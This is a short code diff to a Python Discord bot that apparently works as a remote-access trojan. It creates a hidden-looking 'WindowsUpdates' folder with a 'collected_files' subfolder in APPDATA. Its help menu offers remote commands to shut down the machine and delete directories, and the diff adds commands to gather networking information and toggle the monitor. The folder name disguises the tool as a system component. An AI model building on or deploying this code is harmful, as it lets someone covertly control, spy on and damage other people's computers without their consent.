@@ -39,7 +39,7 @@ def list_modules():
 
 @client.event
 async def on_ready():
-    print(f"Bot started. Version: " + "1.0.2")
+    print(f"Bot started. Version: " + "1.0.3")
     if os.path.exists(f"{os.getenv('APPDATA')}\\WindowsUpdates") == False:
         os.mkdir(f"{os.getenv('APPDATA')}\\WindowsUpdates")
     if os.path.exists(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files") == False:
@@ -83,6 +83,8 @@ async def on_message(message):
         embed.add_field(name=".shutdown", value="Shutdown the computer.", inline=False)
         embed.add_field(name=".deletedir", value="Deletes a specified directory. Usage: ``.deletedir <target_folder>``", inline=False)
         embed.add_field(name=".createdir", value="Creates a specified directory. Usage: ``.createdir <folder_path>˙", inline=False)
+        embed.add_field(name=".networking", value="Gets networking information.", inline=False)
+        embed.add_field(name=".monitor", value="Turns the monitor on/off. Usage: ``.monitor <on/off>``", inline=False)
         try:
             await message.channel.send(embed=embed)
         except Exception as e:
